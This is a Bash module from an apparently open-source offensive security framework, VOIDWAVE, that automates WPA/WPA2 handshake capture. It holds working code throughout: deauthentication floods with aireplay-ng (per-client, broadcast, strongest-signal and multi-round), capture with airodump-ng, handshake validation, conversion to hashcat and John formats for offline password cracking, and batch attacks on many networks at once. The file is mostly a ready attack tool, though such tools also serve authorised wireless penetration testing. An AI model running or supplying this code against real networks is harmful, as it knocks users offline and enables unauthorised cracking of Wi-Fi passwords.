#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Handshake Capture: WPA/WPA2 4-way handshake capture and validation
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_HANDSHAKE_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_HANDSHAKE_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

# Source wireless modules if available
[[ -f "${BASH_SOURCE%/*}/../wireless/loot.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/loot.sh"
[[ -f "${BASH_SOURCE%/*}/../wireless/session.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/session.sh"

#═══════════════════════════════════════════════════════════════════════════════
# HANDSHAKE CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Default timeouts and limits
declare -g HANDSHAKE_CAPTURE_TIMEOUT="${HANDSHAKE_CAPTURE_TIMEOUT:-300}"
declare -g HANDSHAKE_DEAUTH_COUNT="${HANDSHAKE_DEAUTH_COUNT:-10}"
declare -g HANDSHAKE_DEAUTH_DELAY="${HANDSHAKE_DEAUTH_DELAY:-5}"
declare -g HANDSHAKE_DEAUTH_ROUNDS="${HANDSHAKE_DEAUTH_ROUNDS:-3}"
declare -g HANDSHAKE_MIN_CLIENTS="${HANDSHAKE_MIN_CLIENTS:-1}"

# Capture state
declare -g _HANDSHAKE_CAPTURE_PID=""
declare -g _HANDSHAKE_DEAUTH_PID=""
declare -g _HANDSHAKE_CAPTURED="false"
declare -g _HANDSHAKE_FILE=""

#═══════════════════════════════════════════════════════════════════════════════
# HANDSHAKE VALIDATION
#═══════════════════════════════════════════════════════════════════════════════

# Check if capture file contains valid handshake
# Args: $1 = capture file, $2 = target BSSID (optional)
# Returns: 0 if valid handshake found, 1 if not
handshake_validate() {
    local capture_file="$1"
    local target_bssid="${2:-}"

    if [[ ! -f "$capture_file" ]]; then
        log_debug "Capture file not found: $capture_file"
        return 1
    fi

    # Method 1: aircrack-ng validation (fastest)
    if command -v aircrack-ng &>/dev/null; then
        local result
        if [[ -n "$target_bssid" ]]; then
            result=$(aircrack-ng -b "$target_bssid" "$capture_file" 2>/dev/null | grep -E "1 handshake|WPA.*handshake")
        else
            result=$(aircrack-ng "$capture_file" 2>/dev/null | grep -E "1 handshake|WPA.*handshake")
        fi

        if [[ -n "$result" ]]; then
            log_debug "Handshake validated via aircrack-ng"
            return 0
        fi
    fi

    # Method 2: pyrit validation (more thorough)
    if command -v pyrit &>/dev/null; then
        local result
        if [[ -n "$target_bssid" ]]; then
            result=$(pyrit -r "$capture_file" -b "$target_bssid" analyze 2>/dev/null | grep -i "good")
        else
            result=$(pyrit -r "$capture_file" analyze 2>/dev/null | grep -i "good")
        fi

        if [[ -n "$result" ]]; then
            log_debug "Handshake validated via pyrit"
            return 0
        fi
    fi

    # Method 3: cowpatty validation
    if command -v cowpatty &>/dev/null && [[ -n "$target_bssid" ]]; then
        if cowpatty -r "$capture_file" -c 2>/dev/null | grep -qi "Collected"; then
            log_debug "Handshake validated via cowpatty"
            return 0
        fi
    fi

    # Method 4: tshark EAPOL frame count
    if command -v tshark &>/dev/null; then
        local eapol_count
        eapol_count=$(tshark -r "$capture_file" -Y "eapol" 2>/dev/null | wc -l)
        if [[ "$eapol_count" -ge 4 ]]; then
            log_debug "Found $eapol_count EAPOL frames - likely valid handshake"
            return 0
        fi
    fi

    log_debug "No valid handshake found in $capture_file"
    return 1
}

# Get handshake quality/completeness
# Args: $1 = capture file, $2 = target BSSID
# Returns: quality level (0-4 for number of frames)
handshake_get_quality() {
    local capture_file="$1"
    local target_bssid="$2"
    local quality=0

    if command -v tshark &>/dev/null; then
        # Count EAPOL frames
        local frames
        frames=$(tshark -r "$capture_file" -Y "eapol && wlan.bssid == $target_bssid" 2>/dev/null | wc -l)
        quality=$((frames > 4 ? 4 : frames))
    elif command -v aircrack-ng &>/dev/null; then
        # Check aircrack output for handshake
        if aircrack-ng -b "$target_bssid" "$capture_file" 2>/dev/null | grep -q "1 handshake"; then
            quality=4
        fi
    fi

    echo "$quality"
}

#═══════════════════════════════════════════════════════════════════════════════
# DEAUTHENTICATION ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Send deauth packets to specific client
# Args: $1 = interface, $2 = AP BSSID, $3 = client MAC, $4 = count (optional)
handshake_deauth_client() {
    local iface="$1"
    local ap_bssid="$2"
    local client_mac="$3"
    local count="${4:-$HANDSHAKE_DEAUTH_COUNT}"

    log_debug "Deauth: $client_mac from $ap_bssid via $iface"

    if command -v aireplay-ng &>/dev/null; then
        aireplay-ng -0 "$count" -a "$ap_bssid" -c "$client_mac" "$iface" &>/dev/null &
        _HANDSHAKE_DEAUTH_PID=$!
        return 0
    fi

    log_error "aireplay-ng not found"
    return 1
}

# Send broadcast deauth (all clients)
# Args: $1 = interface, $2 = AP BSSID, $3 = count (optional)
handshake_deauth_broadcast() {
    local iface="$1"
    local ap_bssid="$2"
    local count="${3:-$HANDSHAKE_DEAUTH_COUNT}"

    log_debug "Broadcast deauth on $ap_bssid via $iface"

    if command -v aireplay-ng &>/dev/null; then
        aireplay-ng -0 "$count" -a "$ap_bssid" "$iface" &>/dev/null &
        _HANDSHAKE_DEAUTH_PID=$!
        return 0
    fi

    log_error "aireplay-ng not found"
    return 1
}

# Smart deauth - targets clients with best signal
# Args: $1 = interface, $2 = AP BSSID, $3 = channel
handshake_smart_deauth() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"

    log_info "Starting smart deauth on $ap_bssid"

    # Get list of clients
    local clients_file
    clients_file=$(mktemp)

    # Quick scan for clients
    timeout 10 airodump-ng --bssid "$ap_bssid" -c "$channel" -w "$clients_file" --output-format csv "$iface" &>/dev/null

    # Parse clients from CSV
    local clients=()
    if [[ -f "${clients_file}-01.csv" ]]; then
        while IFS=',' read -r station_mac _ _ _ power _ _ _ _ _ bssid _; do
            station_mac=$(echo "$station_mac" | tr -d ' ')
            bssid=$(echo "$bssid" | tr -d ' ')

            if [[ "$bssid" == "$ap_bssid" && "$station_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                clients+=("$station_mac:$power")
            fi
        done < <(tail -n +6 "${clients_file}-01.csv" 2>/dev/null | head -20)

        rm -f "${clients_file}"* 2>/dev/null
    fi

    if [[ ${#clients[@]} -eq 0 ]]; then
        log_warning "No clients found, using broadcast deauth"
        handshake_deauth_broadcast "$iface" "$ap_bssid"
        return
    fi

    # Sort clients by signal strength and deauth best ones
    log_info "Found ${#clients[@]} client(s), targeting strongest signals"

    # Deauth top 3 clients by signal
    local count=0
    for client_info in "${clients[@]}"; do
        local client_mac="${client_info%%:*}"
        handshake_deauth_client "$iface" "$ap_bssid" "$client_mac"
        sleep 1

        ((count++)) || true
        [[ $count -ge 3 ]] && break
    done
}

# Multi-round deauth attack
# Args: $1 = interface, $2 = AP BSSID, $3 = client (optional, broadcast if empty)
handshake_deauth_rounds() {
    local iface="$1"
    local ap_bssid="$2"
    local client="${3:-}"
    local rounds="${HANDSHAKE_DEAUTH_ROUNDS}"

    for ((i = 1; i <= rounds; i++)); do
        log_debug "Deauth round $i/$rounds"

        if [[ -n "$client" ]]; then
            handshake_deauth_client "$iface" "$ap_bssid" "$client"
        else
            handshake_deauth_broadcast "$iface" "$ap_bssid"
        fi

        # Wait for deauth to complete
        wait $_HANDSHAKE_DEAUTH_PID 2>/dev/null

        # Delay between rounds
        sleep "$HANDSHAKE_DEAUTH_DELAY"
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# HANDSHAKE CAPTURE
#═══════════════════════════════════════════════════════════════════════════════

# Start handshake capture
# Args: $1 = interface, $2 = AP BSSID, $3 = channel, $4 = output file
handshake_capture_start() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"
    local output_file="$4"

    # Stop any existing capture
    handshake_capture_stop

    log_info "Starting handshake capture for $ap_bssid on channel $channel"

    # Set channel
    iwconfig "$iface" channel "$channel" 2>/dev/null

    # Start airodump-ng
    airodump-ng --bssid "$ap_bssid" -c "$channel" -w "$output_file" --output-format pcap "$iface" &>/dev/null &
    _HANDSHAKE_CAPTURE_PID=$!
    _HANDSHAKE_FILE="${output_file}-01.cap"

    log_debug "Capture started (PID: $_HANDSHAKE_CAPTURE_PID)"
    return 0
}

# Stop handshake capture
handshake_capture_stop() {
    if [[ -n "$_HANDSHAKE_CAPTURE_PID" ]]; then
        kill "$_HANDSHAKE_CAPTURE_PID" 2>/dev/null
        wait "$_HANDSHAKE_CAPTURE_PID" 2>/dev/null
        _HANDSHAKE_CAPTURE_PID=""
    fi

    if [[ -n "$_HANDSHAKE_DEAUTH_PID" ]]; then
        kill "$_HANDSHAKE_DEAUTH_PID" 2>/dev/null
        wait "$_HANDSHAKE_DEAUTH_PID" 2>/dev/null
        _HANDSHAKE_DEAUTH_PID=""
    fi
}

# Check capture status
# Returns: 0 if handshake captured, 1 if still capturing, 2 if failed
handshake_capture_status() {
    local capture_file="${_HANDSHAKE_FILE}"
    local target_bssid="${1:-}"

    if [[ ! -f "$capture_file" ]]; then
        return 1  # Still capturing
    fi

    if handshake_validate "$capture_file" "$target_bssid"; then
        _HANDSHAKE_CAPTURED="true"
        return 0  # Success
    fi

    # Check if capture process is still running
    if [[ -n "$_HANDSHAKE_CAPTURE_PID" ]] && kill -0 "$_HANDSHAKE_CAPTURE_PID" 2>/dev/null; then
        return 1  # Still capturing
    fi

    return 2  # Failed
}

# Full handshake capture with deauth
# Args: $1 = interface, $2 = AP BSSID, $3 = channel, $4 = ESSID, $5 = client (optional)
handshake_capture_full() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"
    local essid="$4"
    local client="${5:-}"

    local output_dir="${WIRELESS_LOOT_HANDSHAKES:-/tmp}"
    local output_base="${output_dir}/${essid//[^a-zA-Z0-9]/_}_${ap_bssid//:/}"
    local start_time
    start_time=$(date +%s)

    log_info "Starting handshake capture for ${C_WHITE}$essid${C_RESET}"
    log_info "Target: $ap_bssid (Channel $channel)"

    # Start capture
    handshake_capture_start "$iface" "$ap_bssid" "$channel" "$output_base"

    # Wait a bit for capture to stabilize
    sleep 2

    # Update session state if available
    if declare -F wireless_session_set &>/dev/null; then
        wireless_session_set "target_bssid" "$ap_bssid"
        wireless_session_set "target_essid" "$essid"
        wireless_session_set "attack_type" "handshake"
        wireless_session_set "attack_status" "capturing"
    fi

    # Capture loop with deauth
    local timeout="$HANDSHAKE_CAPTURE_TIMEOUT"
    local round=0

    while true; do
        local elapsed=$(($(date +%s) - start_time))

        # Check timeout
        if [[ $elapsed -ge $timeout ]]; then
            log_error "Capture timeout after ${timeout}s"
            handshake_capture_stop
            return 1
        fi

        # Check if handshake captured
        if handshake_capture_status "$ap_bssid"; then
            log_success "Handshake captured!"

            # Stop capture
            handshake_capture_stop

            # Validate and save
            local quality
            quality=$(handshake_get_quality "$_HANDSHAKE_FILE" "$ap_bssid")
            log_info "Handshake quality: $quality/4 frames"

            # Save to loot
            if declare -F wireless_loot_save_handshake &>/dev/null; then
                wireless_loot_save_handshake "$ap_bssid" "$essid" "$_HANDSHAKE_FILE"
            fi

            # Update session
            if declare -F wireless_session_set &>/dev/null; then
                wireless_session_set "handshake_captured" "true"
                wireless_session_set "attack_status" "success"
            fi

            return 0
        fi

        # Perform deauth round
        ((round++)) || true
        log_info "Deauth round $round (${elapsed}s elapsed)"

        if [[ -n "$client" ]]; then
            handshake_deauth_client "$iface" "$ap_bssid" "$client"
        else
            handshake_smart_deauth "$iface" "$ap_bssid" "$channel"
        fi

        # Wait for handshake
        sleep "$HANDSHAKE_DEAUTH_DELAY"
    done
}

# Passive handshake capture (no deauth)
# Args: $1 = interface, $2 = AP BSSID, $3 = channel, $4 = ESSID
handshake_capture_passive() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"
    local essid="$4"

    local output_dir="${WIRELESS_LOOT_HANDSHAKES:-/tmp}"
    local output_base="${output_dir}/${essid//[^a-zA-Z0-9]/_}_${ap_bssid//:/}"
    local start_time
    start_time=$(date +%s)

    log_info "Starting passive handshake capture for ${C_WHITE}$essid${C_RESET}"
    log_info "Target: $ap_bssid (Channel $channel)"
    log_warning "Passive mode - waiting for client to connect/reconnect"

    # Start capture
    handshake_capture_start "$iface" "$ap_bssid" "$channel" "$output_base"

    # Wait for handshake
    local timeout="$HANDSHAKE_CAPTURE_TIMEOUT"

    while true; do
        local elapsed=$(($(date +%s) - start_time))

        # Check timeout
        if [[ $elapsed -ge $timeout ]]; then
            log_error "Passive capture timeout after ${timeout}s"
            handshake_capture_stop
            return 1
        fi

        # Check if handshake captured
        if handshake_capture_status "$ap_bssid"; then
            log_success "Handshake captured passively!"
            handshake_capture_stop

            # Save to loot
            if declare -F wireless_loot_save_handshake &>/dev/null; then
                wireless_loot_save_handshake "$ap_bssid" "$essid" "$_HANDSHAKE_FILE"
            fi

            return 0
        fi

        # Status update every 30 seconds
        if [[ $((elapsed % 30)) -eq 0 ]]; then
            log_info "Waiting... ${elapsed}s elapsed"
        fi

        sleep 5
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# HANDSHAKE CONVERSION
#═══════════════════════════════════════════════════════════════════════════════

# Convert handshake to hashcat format (hc22000)
# Args: $1 = input cap file, $2 = output file (optional)
handshake_convert_hashcat() {
    local input_file="$1"
    local output_file="${2:-${input_file%.cap}.hc22000}"

    if [[ ! -f "$input_file" ]]; then
        log_error "Input file not found: $input_file"
        return 1
    fi

    # Method 1: hcxpcapngtool (recommended)
    if command -v hcxpcapngtool &>/dev/null; then
        if hcxpcapngtool -o "$output_file" "$input_file" &>/dev/null; then
            if [[ -f "$output_file" && -s "$output_file" ]]; then
                log_success "Converted to hashcat format: $output_file"
                return 0
            fi
        fi
    fi

    # Method 2: cap2hccapx (older format)
    if command -v cap2hccapx &>/dev/null; then
        local hccapx_file="${input_file%.cap}.hccapx"
        if cap2hccapx "$input_file" "$hccapx_file" &>/dev/null; then
            log_success "Converted to hccapx format: $hccapx_file"
            return 0
        fi
    fi

    # Method 3: Online conversion hint
    log_warning "No local conversion tool found"
    log_info "Use https://hashcat.net/cap2hashcat/ for online conversion"
    return 1
}

# Convert handshake to John format
# Args: $1 = input cap file, $2 = output file (optional)
handshake_convert_john() {
    local input_file="$1"
    local output_file="${2:-${input_file%.cap}.john}"

    if [[ ! -f "$input_file" ]]; then
        log_error "Input file not found: $input_file"
        return 1
    fi

    # Method 1: wpapcap2john
    if command -v wpapcap2john &>/dev/null; then
        if wpapcap2john "$input_file" > "$output_file" 2>/dev/null; then
            if [[ -f "$output_file" && -s "$output_file" ]]; then
                log_success "Converted to John format: $output_file"
                return 0
            fi
        fi
    fi

    # Method 2: hcxpcapngtool with john output
    if command -v hcxpcapngtool &>/dev/null; then
        if hcxpcapngtool -j "$output_file" "$input_file" &>/dev/null; then
            if [[ -f "$output_file" && -s "$output_file" ]]; then
                log_success "Converted to John format: $output_file"
                return 0
            fi
        fi
    fi

    log_error "Failed to convert to John format"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# CLIENT TARGETING
#═══════════════════════════════════════════════════════════════════════════════

# Get list of clients connected to AP
# Args: $1 = interface, $2 = AP BSSID, $3 = channel
# Returns: list of client MACs
handshake_get_clients() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"

    local clients_file
    clients_file=$(mktemp)

    # Scan for clients
    timeout 15 airodump-ng --bssid "$ap_bssid" -c "$channel" -w "$clients_file" --output-format csv "$iface" &>/dev/null

    local clients=()

    if [[ -f "${clients_file}-01.csv" ]]; then
        while IFS=',' read -r station_mac _ _ _ power _ _ _ _ _ bssid _; do
            station_mac=$(echo "$station_mac" | tr -d ' ')
            bssid=$(echo "$bssid" | tr -d ' ')

            if [[ "$bssid" == "$ap_bssid" && "$station_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                clients+=("$station_mac")
            fi
        done < <(tail -n +6 "${clients_file}-01.csv" 2>/dev/null)

        rm -f "${clients_file}"* 2>/dev/null
    fi

    printf '%s\n' "${clients[@]}"
}

# Get client with best signal
# Args: $1 = interface, $2 = AP BSSID, $3 = channel
handshake_get_best_client() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"

    local clients_file
    clients_file=$(mktemp)

    # Scan for clients
    timeout 15 airodump-ng --bssid "$ap_bssid" -c "$channel" -w "$clients_file" --output-format csv "$iface" &>/dev/null

    local best_client=""
    local best_power=-100

    if [[ -f "${clients_file}-01.csv" ]]; then
        while IFS=',' read -r station_mac _ _ _ power _ _ _ _ _ bssid _; do
            station_mac=$(echo "$station_mac" | tr -d ' ')
            bssid=$(echo "$bssid" | tr -d ' ')
            power=$(echo "$power" | tr -d ' ')

            if [[ "$bssid" == "$ap_bssid" && "$station_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                if [[ "$power" =~ ^-?[0-9]+$ && "$power" -gt "$best_power" ]]; then
                    best_power="$power"
                    best_client="$station_mac"
                fi
            fi
        done < <(tail -n +6 "${clients_file}-01.csv" 2>/dev/null)

        rm -f "${clients_file}"* 2>/dev/null
    fi

    echo "$best_client"
}

#═══════════════════════════════════════════════════════════════════════════════
# BATCH OPERATIONS
#═══════════════════════════════════════════════════════════════════════════════

# Capture handshakes from multiple networks
# Args: $1 = interface, $2 = targets file (BSSID,CHANNEL,ESSID per line)
handshake_batch_capture() {
    local iface="$1"
    local targets_file="$2"

    if [[ ! -f "$targets_file" ]]; then
        log_error "Targets file not found: $targets_file"
        return 1
    fi

    local success=0
    local failed=0
    local total=0

    while IFS=',' read -r bssid channel essid; do
        [[ -z "$bssid" || "$bssid" =~ ^# ]] && continue
        ((total++)) || true

        log_info "Target $total: $essid ($bssid)"

        if handshake_capture_full "$iface" "$bssid" "$channel" "$essid"; then
            ((success++)) || true
            log_success "Captured: $essid"
        else
            ((failed++)) || true
            log_warning "Failed: $essid"
        fi

        # Brief pause between targets
        sleep 2
    done < "$targets_file"

    log_info "Batch complete: $success/$total captured"
    return $((failed > 0 ? 1 : 0))
}

#═══════════════════════════════════════════════════════════════════════════════
# CLEANUP
#═══════════════════════════════════════════════════════════════════════════════

# Cleanup function for handshake capture
handshake_cleanup() {
    handshake_capture_stop

    # Clean temp files
    rm -f /tmp/handshake_*.csv 2>/dev/null
}

# Register cleanup (uses cleanup registry to prevent trap overwriting)
register_cleanup handshake_cleanup

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f handshake_validate handshake_get_quality
export -f handshake_deauth_client handshake_deauth_broadcast handshake_smart_deauth handshake_deauth_rounds
export -f handshake_capture_start handshake_capture_stop handshake_capture_status
export -f handshake_capture_full handshake_capture_passive
export -f handshake_convert_hashcat handshake_convert_john
export -f handshake_get_clients handshake_get_best_client
export -f handshake_batch_capture handshake_cleanup
